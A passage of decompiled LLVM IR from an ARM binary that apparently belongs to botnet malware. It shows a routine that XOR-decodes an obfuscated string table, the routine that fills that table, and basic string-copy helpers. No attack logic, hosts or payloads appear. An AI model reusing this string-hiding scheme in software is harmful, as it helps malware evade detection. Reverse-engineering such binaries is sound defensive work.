  store i32 %v2_11444, i32* @r4, align 4
  ret i32 %v2_113c0

; uselistorder directives
  uselistorder i32 %v1_11438, { 1, 2, 3, 0 }
  uselistorder i32 %v1_113e8, { 1, 0 }
  uselistorder i32 %v3_113d4, { 1, 0 }
  uselistorder i32 %v2_113c4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_113bc, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1145c = mul i32 %arg1, 8
  %v2_11460 = add i32 %v3_1145c, ptrtoint (i32* @global_var_25d74.235 to i32)
  %v2_11464 = load i32, i32* @global_var_230c4.238, align 4
  %v1_11468 = add i32 %v3_1145c, add (i32 ptrtoint (i32* @global_var_25d74.235 to i32), i32 4)
  %v2_11468 = inttoptr i32 %v1_11468 to i16*
  %v3_11468 = load i16, i16* %v2_11468, align 4
  %v3_1146c = udiv i32 %v2_11464, 256
  %v2_11470 = icmp eq i16 %v3_11468, 0
  %v3_11474 = udiv i32 %v2_11464, 65536
  %v3_11478 = load i32, i32* @r4, align 4
  store i32 %v3_11478, i32* %stack_var_-16, align 4
  %v1_1147c = urem i32 %v3_1146c, 256
  store i32 %v1_1147c, i32* %r6.global-to-local, align 4
  %v1_11480 = urem i32 %v3_11474, 256
  store i32 %v1_11480, i32* %r5.global-to-local, align 4
  %v3_11484 = udiv i32 %v2_11464, 16777216
  store i32 %v3_11484, i32* %r4.global-to-local, align 4
  %v1_11488 = urem i32 %v2_11464, 256
  store i32 %v1_11488, i32* %lr.global-to-local, align 4
  br i1 %v2_11470, label %dec_label_pc_114e4, label %dec_label_pc_11490

dec_label_pc_11490:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11494 = inttoptr i32 %v2_11460 to i32*
  br label %dec_label_pc_11494

dec_label_pc_11494:                               ; preds = %dec_label_pc_11494.dec_label_pc_11494_crit_edge, %dec_label_pc_11490
  %v0_1149c = phi i32 [ %v0_1149c.pre, %dec_label_pc_11494.dec_label_pc_11494_crit_edge ], [ %v1_11488, %dec_label_pc_11490 ]
  %v2_114a0 = phi i32 [ %v1_114d8, %dec_label_pc_11494.dec_label_pc_11494_crit_edge ], [ 0, %dec_label_pc_11490 ]
  %v2_11494 = load i32, i32* %v1_11494, align 4
  %v2_11498 = add i32 %v2_11494, %v2_114a0
  %v3_11498 = inttoptr i32 %v2_11498 to i8*
  %v4_11498 = load i8, i8* %v3_11498, align 1
  %v6_11498 = zext i8 %v4_11498 to i32
  %v2_1149c = xor i32 %v6_11498, %v0_1149c
  %v1_114a0 = trunc i32 %v2_1149c to i8
  store i8 %v1_114a0, i8* %v3_11498, align 1
  %v2_114a4 = load i32, i32* %v1_11494, align 4
  %v0_114a8 = load i32, i32* @ip, align 4
  %v2_114a8 = add i32 %v0_114a8, %v2_114a4
  %v3_114a8 = inttoptr i32 %v2_114a8 to i8*
  %v4_114a8 = load i8, i8* %v3_114a8, align 1
  %v6_114a8 = zext i8 %v4_114a8 to i32
  %v0_114ac = load i32, i32* %r6.global-to-local, align 4
  %v2_114ac = xor i32 %v0_114ac, %v6_114a8
  %v1_114b0 = trunc i32 %v2_114ac to i8
  store i8 %v1_114b0, i8* %v3_114a8, align 1
  %v2_114b4 = load i32, i32* %v1_11494, align 4
  %v0_114b8 = load i32, i32* @ip, align 4
  %v2_114b8 = add i32 %v0_114b8, %v2_114b4
  %v3_114b8 = inttoptr i32 %v2_114b8 to i8*
  %v4_114b8 = load i8, i8* %v3_114b8, align 1
  %v6_114b8 = zext i8 %v4_114b8 to i32
  %v0_114bc = load i32, i32* %r5.global-to-local, align 4
  %v2_114bc = xor i32 %v0_114bc, %v6_114b8
  %v1_114c0 = trunc i32 %v2_114bc to i8
  store i8 %v1_114c0, i8* %v3_114b8, align 1
  %v2_114c4 = load i32, i32* %v1_11494, align 4
  %v0_114c8 = load i32, i32* @ip, align 4
  %v2_114c8 = add i32 %v0_114c8, %v2_114c4
  %v3_114c8 = inttoptr i32 %v2_114c8 to i8*
  %v4_114c8 = load i8, i8* %v3_114c8, align 1
  %v6_114c8 = zext i8 %v4_114c8 to i32
  %v0_114cc = load i32, i32* %r4.global-to-local, align 4
  %v2_114cc = xor i32 %v0_114cc, %v6_114c8
  %v1_114d0 = trunc i32 %v2_114cc to i8
  store i8 %v1_114d0, i8* %v3_114c8, align 1
  %v3_114d4 = load i16, i16* %v2_11468, align 4
  %v4_114d4 = zext i16 %v3_114d4 to i32
  %v0_114d8 = load i32, i32* @ip, align 4
  %v1_114d8 = add i32 %v0_114d8, 1
  store i32 %v1_114d8, i32* @ip, align 4
  %v8_114e0 = icmp sgt i32 %v4_114d4, %v1_114d8
  br i1 %v8_114e0, label %dec_label_pc_11494.dec_label_pc_11494_crit_edge, label %dec_label_pc_114e4.loopexit

dec_label_pc_11494.dec_label_pc_11494_crit_edge:  ; preds = %dec_label_pc_11494
  %v0_1149c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11494

dec_label_pc_114e4.loopexit:                      ; preds = %dec_label_pc_11494
  %v2_114e4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_114e4

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114e4.loopexit, %entry
  %v2_114e4 = phi i32 [ %v2_114e4.pre, %dec_label_pc_114e4.loopexit ], [ %v3_11478, %entry ]
  store i32 %v2_114e4, i32* @r4, align 4
  ret i32 %v2_11460

; uselistorder directives
  uselistorder i32 %v1_114d8, { 1, 2, 0 }
  uselistorder i32 %v1_11488, { 1, 0 }
  uselistorder i32 %v2_11464, { 3, 0, 1, 2 }
  uselistorder i32 %v3_1145c, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v9_114f4 = load i32, i32* @r6, align 4
  %v12_114f4 = load i32, i32* @r7, align 4
  %v15_114f4 = load i32, i32* @r8, align 4
  %v21_114f4 = load i32, i32* @sl, align 4
  %v24_114f4 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_11500 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_25d74.235 to i32), i32* @r4, align 4
  store i32 %v0_11500, i32* @r6, align 4
  %v4_11518 = call i32 @util_memcpy(i32 %v0_11500, i32 ptrtoint ([3 x i8]* @global_var_1a8e4.243 to i32), i32 2)
  %v0_1151c = load i32, i32* @r5, align 4
  store i32 %v0_1151c, i32* @r0, align 4
  %v0_11520 = load i32, i32* @r6, align 4
  store i32 %v0_11520, i32* @global_var_25d7c.244, align 4
  %v1_11524 = trunc i32 %v0_1151c to i16
  store i16 %v1_11524, i16* bitcast (i32* @global_var_25d80.245 to i16*), align 4
  %v0_11528 = call i32 @malloc()
  %v0_1152c = load i32, i32* @r5, align 4
  store i32 %v0_11528, i32* @r6, align 4
  %v4_11538 = call i32 @util_memcpy(i32 %v0_11528, i32 ptrtoint ([3 x i8]* @global_var_1a8e8.247 to i32), i32 %v0_1152c)
  store i32 23, i32* @r0, align 4
  %v0_11540 = load i32, i32* @r6, align 4
  store i32 %v0_11540, i32* @global_var_25d84.248, align 4
  %v0_11544 = load i32, i32* @r5, align 4
  %v1_11544 = trunc i32 %v0_11544 to i16
  store i16 %v1_11544, i16* bitcast (i32* @global_var_25d88.249 to i16*), align 4
  %v0_11548 = call i32 @malloc()
  store i32 %v0_11548, i32* @r5, align 4
  %v3_11558 = call i32 @util_memcpy(i32 %v0_11548, i32 ptrtoint (i32* @global_var_1a8ec.251 to i32), i32 23)
  store i32 6, i32* @r0, align 4
  store i16 23, i16* bitcast (i32* @global_var_25d90.252 to i16*), align 4
  %v0_11568 = load i32, i32* @r5, align 4
  store i32 %v0_11568, i32* @global_var_25d8c.253, align 4
  %v0_1156c = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_1156c, i32* @r5, align 4
  %v4_11580 = call i32 @util_memcpy(i32 %v0_1156c, i32 ptrtoint ([7 x i8]* @global_var_1a904.255 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_1158c = load i32, i32* @r5, align 4
  store i32 %v0_1158c, i32* @global_var_25d94.256, align 4
  %v0_11590 = load i32, i32* @sb, align 4
  %v1_11590 = trunc i32 %v0_11590 to i16
  store i16 %v1_11590, i16* bitcast (i32* @global_var_25d98.257 to i16*), align 4
  %v0_11594 = call i32 @malloc()
  %v0_1159c = load i32, i32* @r7, align 4
  store i32 %v0_11594, i32* @r5, align 4
  %v4_115a4 = call i32 @util_memcpy(i32 %v0_11594, i32 ptrtoint ([8 x i8]* @global_var_1a90c.259 to i32), i32 %v0_1159c)
  %v0_115a8 = load i32, i32* @r7, align 4
  store i32 %v0_115a8, i32* @r0, align 4
  %v0_115ac = load i32, i32* @r5, align 4
  store i32 %v0_115ac, i32* @global_var_25d9c.260, align 4
  %v1_115b0 = trunc i32 %v0_115a8 to i16
  store i16 %v1_115b0, i16* bitcast (i32* @global_var_25da0.261 to i16*), align 4
  %v0_115b4 = call i32 @malloc()
  %v0_115bc = load i32, i32* @r7, align 4
  store i32 %v0_115b4, i32* @r5, align 4
  %v4_115c4 = call i32 @util_memcpy(i32 %v0_115b4, i32 ptrtoint ([8 x i8]* @global_var_1a914.263 to i32), i32 %v0_115bc)
  store i32 3, i32* @r0, align 4
  %v0_115cc = load i32, i32* @r5, align 4
  store i32 %v0_115cc, i32* @global_var_25da4.264, align 4
  %v0_115d0 = load i32, i32* @r7, align 4
  %v1_115d0 = trunc i32 %v0_115d0 to i16
  store i16 %v1_115d0, i16* bitcast (i32* @global_var_25da8.265 to i16*), align 4
  %v0_115d4 = call i32 @malloc()
  store i32 %v0_115d4, i32* @r5, align 4
  %v4_115e4 = call i32 @util_memcpy(i32 %v0_115d4, i32 ptrtoint ([4 x i8]* @global_var_1a91c.267 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_25db0.268 to i16*), align 4
  %v0_115f4 = load i32, i32* @r5, align 4
  store i32 %v0_115f4, i32* @global_var_25dac.269, align 4
  %v0_115f8 = call i32 @malloc()
  store i32 %v0_115f8, i32* @r5, align 4
  %v3_11608 = call i32 @util_memcpy(i32 %v0_115f8, i32 ptrtoint (i32* @global_var_1a920.271 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_25db8.272 to i16*), align 4
  %v0_11618 = load i32, i32* @r5, align 4
  store i32 %v0_11618, i32* @global_var_25db4.273, align 4
  %v0_1161c = call i32 @malloc()
  store i32 %v0_1161c, i32* @r5, align 4
  %v3_1162c = call i32 @util_memcpy(i32 %v0_1161c, i32 ptrtoint (i32* @global_var_1a934.275 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_25dc0.276 to i16*), align 4
  %v0_1163c = load i32, i32* @r5, align 4
  store i32 %v0_1163c, i32* @global_var_25dbc.277, align 4
  %v0_11640 = call i32 @malloc()
  store i32 %v0_11640, i32* @r5, align 4
  %v4_11650 = call i32 @util_memcpy(i32 %v0_11640, i32 ptrtoint ([10 x i8]* @global_var_1a950.279 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_25dc8.280 to i16*), align 4
  %v0_11660 = load i32, i32* @r5, align 4
  store i32 %v0_11660, i32* @global_var_25dc4.281, align 4
  %v0_11664 = call i32 @malloc()
  store i32 %v0_11664, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_11678 = call i32 @util_memcpy(i32 %v0_11664, i32 ptrtoint ([17 x i8]* @global_var_1a95c.283 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_11680 = load i32, i32* @r5, align 4
  store i32 %v0_11680, i32* @global_var_25dcc.284, align 4
  %v0_11684 = load i32, i32* @sl, align 4
  %v1_11684 = trunc i32 %v0_11684 to i16
  store i16 %v1_11684, i16* bitcast (i32* @global_var_25dd0.285 to i16*), align 4
  %v0_11688 = call i32 @malloc()
  store i32 %v0_11688, i32* @r5, align 4
  %v4_11698 = call i32 @util_memcpy(i32 %v0_11688, i32 ptrtoint ([23 x i8]* @global_var_1a970.287 to i32), i32 22)
  %v0_116a0 = load i32, i32* @r7, align 4
  store i32 %v0_116a0, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_25dd8.288 to i16*), align 4
  %v0_116a8 = load i32, i32* @r5, align 4
  store i32 %v0_116a8, i32* @global_var_25dd4.289, align 4
  %v0_116ac = call i32 @malloc()
  %v0_116b4 = load i32, i32* @r7, align 4
  store i32 %v0_116ac, i32* @r5, align 4
  %v4_116bc = call i32 @util_memcpy(i32 %v0_116ac, i32 ptrtoint ([8 x i8]* @global_var_1a988.291 to i32), i32 %v0_116b4)
  store i32 5, i32* @r0, align 4
  %v0_116c4 = load i32, i32* @r5, align 4
  store i32 %v0_116c4, i32* @global_var_25ddc.292, align 4
  %v0_116c8 = load i32, i32* @r7, align 4
  %v1_116c8 = trunc i32 %v0_116c8 to i16
  store i16 %v1_116c8, i16* bitcast (i32* @global_var_25de0.293 to i16*), align 4
  %v0_116cc = call i32 @malloc()
  store i32 %v0_116cc, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_116e0 = call i32 @util_memcpy(i32 %v0_116cc, i32 ptrtoint ([6 x i8]* @global_var_1a990.295 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_116e8 = load i32, i32* @r5, align 4
  store i32 %v0_116e8, i32* @global_var_25de4.296, align 4
  %v0_116ec = load i32, i32* @fp, align 4
  %v1_116ec = trunc i32 %v0_116ec to i16
  store i16 %v1_116ec, i16* bitcast (i32* @global_var_25de8.297 to i16*), align 4
  %v0_116f0 = call i32 @malloc()
  store i32 %v0_116f0, i32* @r5, align 4
  %v4_11700 = call i32 @util_memcpy(i32 %v0_116f0, i32 ptrtoint ([5 x i8]* @global_var_1a998.299 to i32), i32 4)
  %v0_11708 = load i32, i32* @sb, align 4
  store i32 %v0_11708, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_25df0.300 to i16*), align 4
  %v0_11710 = load i32, i32* @r5, align 4
  store i32 %v0_11710, i32* @global_var_25dec.301, align 4
  %v0_11714 = call i32 @malloc()
  %v0_1171c = load i32, i32* @sb, align 4
  store i32 %v0_11714, i32* @r5, align 4
  %v4_11724 = call i32 @util_memcpy(i32 %v0_11714, i32 ptrtoint ([7 x i8]* @global_var_1a9a0.303 to i32), i32 %v0_1171c)
  store i32 14, i32* @r0, align 4
  %v0_1172c = load i32, i32* @r5, align 4
  store i32 %v0_1172c, i32* @global_var_25df4.304, align 4
  %v0_11730 = load i32, i32* @sb, align 4
  %v1_11730 = trunc i32 %v0_11730 to i16
  store i16 %v1_11730, i16* bitcast (i32* @global_var_25df8.305 to i16*), align 4
  %v0_11734 = call i32 @malloc()
  store i32 %v0_11734, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_11748 = call i32 @util_memcpy(i32 %v0_11734, i32 ptrtoint ([15 x i8]* @global_var_1a9a8.307 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_11750 = load i32, i32* @r5, align 4
  store i32 %v0_11750, i32* @global_var_25dfc.308, align 4
  %v0_11754 = load i32, i32* @r8, align 4
  %v1_11754 = trunc i32 %v0_11754 to i16
  store i16 %v1_11754, i16* bitcast (i32* @global_var_25e00.309 to i16*), align 4
  %v0_11758 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_11758, i32* @r5, align 4
  %v4_1176c = call i32 @util_memcpy(i32 %v0_11758, i32 ptrtoint ([9 x i8]* @global_var_1a9b8.311 to i32), i32 8)
  %v0_11770 = load i32, i32* @r7, align 4
  store i32 %v0_11770, i32* @r0, align 4
  %v0_11774 = load i32, i32* @r5, align 4
  store i32 %v0_11774, i32* @global_var_25e5c.312, align 4
  %v0_11778 = load i32, i32* @r6, align 4
  %v1_11778 = trunc i32 %v0_11778 to i16
  store i16 %v1_11778, i16* bitcast (i32* @global_var_25e60.313 to i16*), align 4
  %v0_1177c = call i32 @malloc()
  %v0_11784 = load i32, i32* @r7, align 4
  store i32 %v0_1177c, i32* @r5, align 4
  %v4_1178c = call i32 @util_memcpy(i32 %v0_1177c, i32 ptrtoint ([8 x i8]* @global_var_1a9c4.315 to i32), i32 %v0_11784)
  %v0_11790 = load i32, i32* @sl, align 4
  store i32 %v0_11790, i32* @r0, align 4
  %v0_11794 = load i32, i32* @r5, align 4
  store i32 %v0_11794, i32* @global_var_25e64.316, align 4
  %v0_11798 = load i32, i32* @r7, align 4
  %v1_11798 = trunc i32 %v0_11798 to i16
  store i16 %v1_11798, i16* bitcast (i32* @global_var_25e68.317 to i16*), align 4
  %v0_1179c = call i32 @malloc()
  %v0_117a4 = load i32, i32* @sl, align 4
  store i32 %v0_1179c, i32* @r5, align 4
  %v4_117ac = call i32 @util_memcpy(i32 %v0_1179c, i32 ptrtoint ([17 x i8]* @global_var_1a9cc.319 to i32), i32 %v0_117a4)
  %v0_117b0 = load i32, i32* @r6, align 4
  store i32 %v0_117b0, i32* @r0, align 4
  %v0_117b4 = load i32, i32* @r5, align 4
  store i32 %v0_117b4, i32* @global_var_25e04.320, align 4
  %v0_117b8 = load i32, i32* @sl, align 4
  %v1_117b8 = trunc i32 %v0_117b8 to i16
  store i16 %v1_117b8, i16* bitcast (i32* @global_var_25e08.321 to i16*), align 4
  %v0_117bc = call i32 @malloc()
  %v0_117c4 = load i32, i32* @r6, align 4
  store i32 %v0_117bc, i32* @r5, align 4
  %v4_117cc = call i32 @util_memcpy(i32 %v0_117bc, i32 ptrtoint ([9 x i8]* @global_var_1a9e0.323 to i32), i32 %v0_117c4)
  store i32 21, i32* @r0, align 4
  %v0_117d4 = load i32, i32* @r5, align 4
  store i32 %v0_117d4, i32* @global_var_25e0c.324, align 4
  %v0_117d8 = load i32, i32* @r6, align 4
  %v1_117d8 = trunc i32 %v0_117d8 to i16
  store i16 %v1_117d8, i16* bitcast (i32* @global_var_25e10.325 to i16*), align 4
  %v0_117dc = call i32 @malloc()
  store i32 %v0_117dc, i32* @r5, align 4
  %v3_117ec = call i32 @util_memcpy(i32 %v0_117dc, i32 ptrtoint (i32* @global_var_1aa68.327 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25e18.328 to i16*), align 4
  %v0_117fc = load i32, i32* @r5, align 4
  store i32 %v0_117fc, i32* @global_var_25e14.329, align 4
  %v0_11800 = call i32 @malloc()
  store i32 %v0_11800, i32* @r5, align 4
  %v4_11810 = call i32 @util_memcpy(i32 %v0_11800, i32 ptrtoint ([18 x i8]* @global_var_1a9ec.331 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_25e20.332 to i16*), align 4
  %v0_11820 = load i32, i32* @r5, align 4
  store i32 %v0_11820, i32* @global_var_25e1c.333, align 4
  %v0_11824 = call i32 @malloc()
  store i32 %v0_11824, i32* @r5, align 4
  %v4_11834 = call i32 @util_memcpy(i32 %v0_11824, i32 ptrtoint ([13 x i8]* @global_var_1aa00.335 to i32), i32 12)
  %v0_1183c = load i32, i32* @r8, align 4
  store i32 %v0_1183c, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_25e28.336 to i16*), align 4
  %v0_11844 = load i32, i32* @r5, align 4
  store i32 %v0_11844, i32* @global_var_25e24.337, align 4
  %v0_11848 = call i32 @malloc()
  %v0_11850 = load i32, i32* @r8, align 4
  store i32 %v0_11848, i32* @r5, align 4
  %v4_11858 = call i32 @util_memcpy(i32 %v0_11848, i32 ptrtoint ([15 x i8]* @global_var_1aa10.339 to i32), i32 %v0_11850)
  store i32 19, i32* @r0, align 4
  %v0_11860 = load i32, i32* @r5, align 4
  store i32 %v0_11860, i32* @global_var_25e2c.340, align 4
  %v0_11864 = load i32, i32* @r8, align 4
  %v1_11864 = trunc i32 %v0_11864 to i16
  store i16 %v1_11864, i16* bitcast (i32* @global_var_25e30.341 to i16*), align 4
  %v0_11868 = call i32 @malloc()
  store i32 %v0_11868, i32* @r5, align 4
  %v4_11878 = call i32 @util_memcpy(i32 %v0_11868, i32 ptrtoint ([20 x i8]* @global_var_1aa20.343 to i32), i32 19)
  %v0_11880 = load i32, i32* @r6, align 4
  store i32 %v0_11880, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_25e38.344 to i16*), align 4
  %v0_11888 = load i32, i32* @r5, align 4
  store i32 %v0_11888, i32* @global_var_25e34.345, align 4
  %v0_1188c = call i32 @malloc()
  %v0_11894 = load i32, i32* @r6, align 4
  store i32 %v0_1188c, i32* @r5, align 4
  %v4_1189c = call i32 @util_memcpy(i32 %v0_1188c, i32 ptrtoint ([9 x i8]* @global_var_1aa34.347 to i32), i32 %v0_11894)
  %v0_118a0 = load i32, i32* @fp, align 4
  store i32 %v0_118a0, i32* @r0, align 4
  %v0_118a4 = load i32, i32* @r5, align 4
  store i32 %v0_118a4, i32* @global_var_25e3c.348, align 4
  %v0_118a8 = load i32, i32* @r6, align 4
  %v1_118a8 = trunc i32 %v0_118a8 to i16
  store i16 %v1_118a8, i16* bitcast (i32* @global_var_25e40.349 to i16*), align 4
  %v0_118ac = call i32 @malloc()
  %v0_118b4 = load i32, i32* @fp, align 4
  store i32 %v0_118ac, i32* @r5, align 4
  %v4_118bc = call i32 @util_memcpy(i32 %v0_118ac, i32 ptrtoint ([6 x i8]* @global_var_1aa40.351 to i32), i32 %v0_118b4)
  %v0_118c0 = load i32, i32* @sb, align 4
  store i32 %v0_118c0, i32* @r0, align 4
  %v0_118c4 = load i32, i32* @r5, align 4
  store i32 %v0_118c4, i32* @global_var_25e44.352, align 4
  %v0_118c8 = load i32, i32* @fp, align 4
  %v1_118c8 = trunc i32 %v0_118c8 to i16
  store i16 %v1_118c8, i16* bitcast (i32* @global_var_25e48.353 to i16*), align 4
  %v0_118cc = call i32 @malloc()
  %v0_118d4 = load i32, i32* @sb, align 4
  store i32 %v0_118cc, i32* @r5, align 4
  %v4_118dc = call i32 @util_memcpy(i32 %v0_118cc, i32 ptrtoint ([7 x i8]* @global_var_1aa48.355 to i32), i32 %v0_118d4)
  store i32 23, i32* @r0, align 4
  %v0_118e4 = load i32, i32* @r5, align 4
  store i32 %v0_118e4, i32* @global_var_25e4c.356, align 4
  %v0_118e8 = load i32, i32* @sb, align 4
  %v1_118e8 = trunc i32 %v0_118e8 to i16
  store i16 %v1_118e8, i16* bitcast (i32* @global_var_25e50.357 to i16*), align 4
  %v0_118ec = call i32 @malloc()
  %v4_118fc = call i32 @util_memcpy(i32 %v0_118ec, i32 ptrtoint ([24 x i8]* @global_var_1aa50.359 to i32), i32 23)
  store i16 23, i16* bitcast (i32* @global_var_25e58.360 to i16*), align 4
  store i32 %v0_118ec, i32* @global_var_25e54.361, align 4
  store i32 %v9_114f4, i32* @r6, align 4
  store i32 %v12_114f4, i32* @r7, align 4
  store i32 %v15_114f4, i32* @r8, align 4
  store i32 %v21_114f4, i32* @sl, align 4
  store i32 %v24_114f4, i32* @fp, align 4
  ret i32 %v4_118fc

; uselistorder directives
  uselistorder i32 %v0_118cc, { 1, 0 }
  uselistorder i32 %v0_118ac, { 1, 0 }
  uselistorder i32 %v0_1188c, { 1, 0 }
  uselistorder i32 %v0_11848, { 1, 0 }
  uselistorder i32 %v0_117bc, { 1, 0 }
  uselistorder i32 %v0_1179c, { 1, 0 }
  uselistorder i32 %v0_1177c, { 1, 0 }
  uselistorder i32 %v0_11758, { 1, 0 }
  uselistorder i32 %v0_11714, { 1, 0 }
  uselistorder i32 %v0_116ac, { 1, 0 }
  uselistorder i32 %v0_115b4, { 1, 0 }
  uselistorder i32 %v0_11594, { 1, 0 }
  uselistorder i32 %v0_1156c, { 1, 0 }
  uselistorder i32 %v0_11528, { 1, 0 }
  uselistorder i32 %v0_11500, { 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 6, 7, 8, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0, 7, 6, 4, 3, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_25d74.235 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_11998 = load i8, i8* %arg1, align 1
  %v2_1199c = icmp eq i8 %v3_11998, 0
  %v0_119a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1199c, i32 %v0_119a0)
  br label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_119a8, %entry
  %v0_119a8 = phi i32 [ %v1_119a8, %dec_label_pc_119a8 ], [ 0, %entry ]
  %v1_119a8 = add i32 %v0_119a8, 1
  %v2_119ac = add i32 %v1_119a8, %tmp
  %v3_119ac = inttoptr i32 %v2_119ac to i8*
  %v4_119ac = load i8, i8* %v3_119ac, align 1
  %v6_119ac = zext i8 %v4_119ac to i32
  store i32 %v6_119ac, i32* @r3, align 4
  %v2_119b0 = icmp eq i8 %v4_119ac, 0
  br i1 %v2_119b0, label %dec_label_pc_119b8, label %dec_label_pc_119a8

dec_label_pc_119b8:                               ; preds = %dec_label_pc_119a8
  ret i32 %v1_119a8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_119bc = load i8, i8* %arg1, align 1
  %v3_119bc = zext i8 %v2_119bc to i32
  store i32 %v3_119bc, i32* @r2, align 4
  %v2_119c0 = icmp eq i8 %v2_119bc, 0
  br i1 %v2_119c0, label %bb, label %dec_label_pc_119cc

bb:                                               ; preds = %entry
  store i32 %v3_119bc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_119e0

dec_label_pc_119cc:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119d0, %dec_label_pc_119cc
  %v0_119d0 = phi i32 [ %v1_119d0, %dec_label_pc_119d0 ], [ 0, %dec_label_pc_119cc ]
  %v1_119d0 = add i32 %v0_119d0, 1
  store i32 %v1_119d0, i32* %ip.global-to-local, align 4
  %v2_119d4 = add i32 %v1_119d0, %tmp
  %v3_119d4 = inttoptr i32 %v2_119d4 to i8*
  %v4_119d4 = load i8, i8* %v3_119d4, align 1
  %v2_119d8 = icmp eq i8 %v4_119d4, 0
  br i1 %v2_119d8, label %dec_label_pc_119e0, label %dec_label_pc_119d0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119d0, %bb
  %v0_119e0 = phi i32 [ %v3_119bc, %bb ], [ %v1_119d0, %dec_label_pc_119d0 ]
  br label %dec_label_pc_119ec

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119ec
  %v0_119e8 = load i32, i32* @r1, align 4
  %v1_119e8 = add i32 %v0_119e8, 1
  %v2_119e8 = inttoptr i32 %v1_119e8 to i8*
  %v3_119e8 = load i8, i8* %v2_119e8, align 1
  %v4_119e8 = zext i8 %v3_119e8 to i32
  store i32 %v4_119e8, i32* @r2, align 4
  store i32 %v1_119e8, i32* @r1, align 4
  %v0_119ec.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e0, %dec_label_pc_119e8
  %v0_119f4.off0 = phi i8 [ %v2_119bc, %dec_label_pc_119e0 ], [ %v3_119e8, %dec_label_pc_119e8 ]
  %v0_119ec = phi i32 [ %v0_119e0, %dec_label_pc_119e0 ], [ %v0_119ec.pr, %dec_label_pc_119e8 ]
  %v1_119ec = add i32 %v0_119ec, -1
  store i32 %v1_119ec, i32* @r3, align 4
  %v3_119f0 = icmp eq i32 %v0_119ec, 0
  %v2_119f4 = load i32, i32* @r0, align 4
  %v3_119f4 = inttoptr i32 %v2_119f4 to i8*
  store i8 %v0_119f4.off0, i8* %v3_119f4, align 1
  %v4_119f4 = load i32, i32* @r0, align 4
  %v5_119f4 = add i32 %v4_119f4, 1
  store i32 %v5_119f4, i32* @r0, align 4
  br i1 %v3_119f0, label %dec_label_pc_119fc, label %dec_label_pc_119e8

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119ec
  %v0_119fc = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_119fc

; uselistorder directives
  uselistorder i32 %v0_119ec, { 1, 0 }
  uselistorder i32 %v1_119d0, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_119ec, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_11a04 = icmp eq i32 %arg3, 0
  %v0_11a08 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11a04, i32 %v0_11a08)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_11a10, %entry
